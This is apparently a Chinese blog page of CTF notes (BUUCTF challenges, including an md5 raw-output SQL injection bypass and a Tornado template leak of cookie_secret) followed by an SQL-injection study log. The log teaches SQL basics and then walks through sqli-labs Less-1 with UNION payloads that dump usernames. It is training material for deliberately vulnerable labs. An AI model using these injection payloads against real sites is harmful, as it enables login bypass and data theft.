<p>经过md5加密后：<code>276f722736c95d99e921722cf9ed621c</code></p>
<p>再转换为字符串：<code>&#39;or&#39;6&lt;乱码&gt;  即  &#39;or&#39;66�]��!r,��b</code></p>
<p>用途：</p>
<p><code>select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;</code></p>
<p><code>就相当于select * from admin where password=&#39;&#39;or 1  实现sql注入</code></p>
<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>简单，新手村难度<br>cookie + 传参 +PHP特性</p>
<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>随便点了一个文件，发现了这个传参</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee">http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee</a></p>
</blockquote>
<p>根据<code>hints.txt</code>发现了<code>md5(cookie_secret+md5(filename))</code></p>
<p><code>cookie_secret</code>这玩意到底是个啥，俺不知道，肯定没法破解</p>
<p>不过阴差阳错访问到了这个</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=">http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=</a>2</p>
</blockquote>
<p>看样子是python沙箱逃逸了,简单fuzz一下，透心凉，心飞扬</p>
<p>搜索一下，</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=">http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=</a></p>
</blockquote>
<p><code>&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;6dcbf553-b18a-46ba-9487-8cf74e2c43ca&#39;&#125; </code></p>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-06  <a class="commentCountImg" href="/2022/10/06/sql/#comment-container"><span class="display-none-class">30b5cf867459a4c81a8eca9a8aa68607</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="30b5cf867459a4c81a8eca9a8aa68607">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>24 分钟  <i class="fas fa-pencil-alt"> </i>3.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/06/sql/">SQL注入学习寄录</a></h1><div class="content"><h1 id="0x01-SQL"><a href="#0x01-SQL" class="headerlink" title="0x01 SQL"></a>0x01 SQL</h1><h2 id="SQL-是一种标准"><a href="#SQL-是一种标准" class="headerlink" title="SQL 是一种标准"></a>SQL 是一种标准</h2><p>SQL 是一门 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言，但是仍然存在着多种不同版本的 SQL 语言。</p>
<h2 id="库-amp-表"><a href="#库-amp-表" class="headerlink" title="库&amp;表"></a>库&amp;表</h2><p>一个数据库通常包括一个或多个表。每个表都有一个名字标识，表包含带有数据的记录。</p>
<h2 id="SQL-基础语法"><a href="#SQL-基础语法" class="headerlink" title="SQL 基础语法"></a>SQL 基础语法</h2><h3 id="最简单的查询"><a href="#最简单的查询" class="headerlink" title="最简单的查询"></a>最简单的查询</h3><p><strong>SELECT * FROM 表名</strong></p>
<p>这个语句会把当前表下所有的数据全都列出来，在数据量比较小的时候会很好用，但当数据量特别大的时候就容易被一堆数据淹没，不知所措。</p>
<p><img src="/images/sql/1.png"></p>
<p>这时候可以添加限制，指定我要哪一列的数据</p>
<p><strong>SELECT 列名 FROM 表名</strong></p>
<p><img src="/images/sql/2.png"></p>
<p>数据还是很多，可以添加<code>WHERE</code>来进行进一步限制</p>
<p><strong>SELECT 列名 FROM 表名 WHERE 条件</strong></p>
<p><img src="/images/sql/3.png"></p>
<p><img src="/images/sql/4.png"></p>
<p><img src="/images/sql/5.png"></p>
<p>如果需要将数据排序的话，可以用<code>ORDER BY</code></p>
<p><strong>SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名</strong></p>
<p><img src="/images/sql/6.png"></p>
<p>有时候，咱只想返回前几条数据，就可以加入<code>LIMIT</code></p>
<p><strong>SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 LIMIT 数字</strong></p>
<p><img src="/images/sql/7.png"></p>
<h3 id="SQL操作符"><a href="#SQL操作符" class="headerlink" title="SQL操作符"></a>SQL操作符</h3><p><strong>WHERE 列名 LIKE 通配符</strong></p>
<p>按照通配符匹配</p>
<table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代0个或多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代1个字符</td>
</tr>
<tr>
<td align="left">[charlist]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^charlist] 或 [!charlist]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p><strong>WHERE 列名 IN (‘值1’,’值2’)</strong></p>
<p><strong>WHERE 列名 BETWEEN 值1 AND 值2;</strong></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>SELECT 列名1,列名2… FROM table1 UNION SELECT 列名1,列名2… FROM table2;</strong></p>
<p>注意:联合查询要求前后字段数相同，否则将会报错.</p>
<h2 id="特殊的数据库information-schema"><a href="#特殊的数据库information-schema" class="headerlink" title="特殊的数据库information_schema"></a>特殊的数据库<code>information_schema</code></h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/88342863">摘自这里</a></p>
<p>在数据库里，有这样一个数据库<code>information_schema</code>，数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
<table>
<thead>
<tr>
<th align="left">表名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SCHEMATA</td>
<td align="left">提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</td>
</tr>
<tr>
<td align="left">TABLES</td>
<td align="left">提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</td>
</tr>
<tr>
<td align="left">COLUMNS</td>
<td align="left">供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</td>
</tr>
<tr>
<td align="left">STATISTICS</td>
<td align="left">提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</td>
</tr>
<tr>
<td align="left">USER_PRIVILEGES</td>
<td align="left">给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">SCHEMA_PRIVILEGES</td>
<td align="left">给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">TABLE_PRIVILEGES（表权限）</td>
<td align="left">给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">COLUMN_PRIVILEGES（列权限）</td>
<td align="left">给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">CHARACTER_SETS（字符集）</td>
<td align="left">提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</td>
</tr>
<tr>
<td align="left">…</td>
<td align="left">…</td>
</tr>
</tbody></table>
<p>在注入的过程中，我们常用的是<code>information_schema.tables</code>下面的<code>table_name</code>以及<code>table_schema</code>表名及其所在的数据库名字。<br>使用<code>information_schema.columns</code>下的<code>column_name</code>获取列名</p>
<h2 id="select-的其他用法"><a href="#select-的其他用法" class="headerlink" title="select 的其他用法"></a>select 的其他用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (1&gt;2);</span><br><span class="line">+-------+</span><br><span class="line">| (1&gt;2) |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (1&lt;2);</span><br><span class="line">+-------+</span><br><span class="line">| (1&lt;2) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &quot;aaaa&quot;;</span><br><span class="line">+------+</span><br><span class="line">| aaaa |</span><br><span class="line">+------+</span><br><span class="line">| aaaa |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (1&lt;2) from users;</span><br><span class="line">+-------+</span><br><span class="line">| (1&lt;2) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (version());</span><br><span class="line">+-------------------------+</span><br><span class="line">| (version())             |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="SQL-注入常用函数"><a href="#SQL-注入常用函数" class="headerlink" title="SQL 注入常用函数"></a>SQL 注入常用函数</h2><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><h4 id="1-concat-函数"><a href="#1-concat-函数" class="headerlink" title="1. concat()函数"></a>1. concat()函数</h4><ul>
<li><p>功能：将多个字符串连接成一个字符串。</p>
</li>
<li><p>语法：concat(str1, str2,…)</p>
</li>
<li><p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+---------------------+</span><br><span class="line">| concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| abc                 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------------------------+</span><br><span class="line">| concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| abcnull                    |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-concat-ws-函数"><a href="#2-concat-ws-函数" class="headerlink" title="2. concat_ws()函数"></a>2. concat_ws()函数</h4><ul>
<li>功能 和<code>concat()</code>一样，但是可以指定分隔符</li>
<li>语法：concat_ws(separator, str1, str2, …)</li>
<li>第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&#x27;#&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| concat_ws(&#x27;#&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| a#b#c#null                        |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="3-group-concat-函数"><a href="#3-group-concat-函数" class="headerlink" title="3.group_concat()函数"></a>3.group_concat()函数</h4><ul>
<li>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</li>
<li>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc ] [separator] )</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,(select group_concat(username) from users); </span><br><span class="line">+---+---------------------------------------------------------------------------------------------+</span><br><span class="line">| 1 | (select group_concat(username) from users)                                                  |</span><br><span class="line">+---+---------------------------------------------------------------------------------------------+</span><br><span class="line">| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |</span><br><span class="line">+---+---------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="盲注常用"><a href="#盲注常用" class="headerlink" title="盲注常用"></a>盲注常用</h3><h4 id="1-ascii-函数"><a href="#1-ascii-函数" class="headerlink" title="1.ascii()函数"></a>1.ascii()函数</h4><p>都会用，不说了</p>
<h4 id="2-substr-函数"><a href="#2-substr-函数" class="headerlink" title="2.substr()函数"></a>2.substr()函数</h4><ul>
<li>substr(str,pos,len);&#x2F;&#x2F;str:字符串，pos：起始位置，len：截断长度</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,1,1);</span><br><span class="line">+-----------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,1,1) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| a                     |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,1,3);</span><br><span class="line">+-----------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,1,3) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| abc                   |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,2,3);</span><br><span class="line">+-----------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,2,3) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| bcd                   |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,-2,3) |</span><br><span class="line">+------------------------+</span><br><span class="line">| fg                     |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,-2,1) |</span><br><span class="line">+------------------------+</span><br><span class="line">| f                      |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,-3,2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| ef                     |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>都会，不说了</p>
<h3 id="报错注入常用"><a href="#报错注入常用" class="headerlink" title="报错注入常用"></a>报错注入常用</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><h4 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h4><h1 id="0x02-SQL注入靶场–Sqli-labs"><a href="#0x02-SQL注入靶场–Sqli-labs" class="headerlink" title="0x02 SQL注入靶场–Sqli-labs"></a>0x02 SQL注入靶场–Sqli-labs</h1><h2 id="Less-1-显错注入"><a href="#Less-1-显错注入" class="headerlink" title="Less-1 | 显错注入"></a>Less-1 | 显错注入</h2><p>判断注入点为字符型还是数字型:</p>
<blockquote>
<p>?id&#x3D;1<br><img src="/images/sql/8.png"></p>
</blockquote>
<blockquote>
<p>id&#x3D;2<br><img src="/images/sql/9.png"></p>
</blockquote>
<blockquote>
<p>id&#x3D;1+1<br><img src="/images/sql/10.png"></p>
</blockquote>
<p>这里可以发现，没有对我们输入的<code>1+1</code>进行运算,可以确定是字符型注入。<br>查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里有个令人异或的地方:<br><code>?id=1+1</code>为啥返回了<code>?id=1</code>的结果，这里进mysql控制台里面康康。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1+1&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;1&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;1a&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;a1&quot;;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;0x1&quot;;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=0x1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=+0b01;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=+ 0b01;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>这宛如PHP一样强大的鲁棒性，我已经有不好的预感了。</p>
<p>众所周知，方便程序员写代码 &#x3D; 方便黑客进来搞事情。</p>
<h3 id="更深入的测试"><a href="#更深入的测试" class="headerlink" title="更深入的测试"></a>更深入的测试</h3><p>联合注入:</p>
<blockquote>
<p>?id&#x3D;1’ union select 1,2,3 –+</p>
</blockquote>
<p>实际执行的是，这里<code>--+</code>是将后面的内容注释掉了</p>
<blockquote>
<p>SELECT * FROM users WHERE id&#x3D;’1’ union select 1,2,3 –+ LIMIT 0,1</p>
</blockquote>
<p><img src="/images/sql/11.png"></p>
<p>好像啥都没变，不过在后端的代码里可以看见相关的逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>MySQL返回的是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>但因为后端代码的设计，只能显示第一条，这时候我们可以让前面id指向一个不存在的数据,这样第一条数据就只会返回空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3; </span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><img src="/images/sql/12.png"></p>
<h3 id="开始爆金币数据了"><a href="#开始爆金币数据了" class="headerlink" title="开始爆金币数据了"></a>开始爆<del>金币</del>数据了</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,(select username from users limit 4,1),3  –+</p>
</blockquote>
<p>因为<code>select username from users</code>会返回多条数据，这时候使用<code>limit</code>来限制返回哪一行</p>
<p><img src="/images/sql/13.png"></p>
